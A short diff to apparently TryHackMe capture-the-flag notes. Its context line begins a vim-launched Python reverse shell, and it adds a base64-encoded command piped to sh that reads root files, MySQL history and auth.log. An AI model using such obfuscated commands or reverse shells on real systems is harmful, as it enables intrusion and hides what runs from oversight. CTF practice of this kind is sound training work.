@@ -21,3 +21,8 @@ vim -c ':!python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET
 6. /home/tryhackme/flag7
 7. /var/flag.txt
 8. /var/log/auth.log
+
+### Read All Flags
+```
+echo Y2F0IC9yb290L2ZsYWc7Y2F0IC9yb290Ly5wcm9maWxlO2NhdCAvcm9vdC8ubXlzcWxfaGlzdG9yeTtjYXQgL2hvbWUvYnJlYWQvZmxhZztjYXQgL2hvbWUvZm9vZC8uZmxhZztjYXQgL2hvbWUvdHJ5aGFja21lL2ZsYWc3O2NhdCAvdmFyL2ZsYWcudHh0O2NhdCAvdmFyL2xvZy9hdXRoLmxvZw== |base64 -d |sh
+```
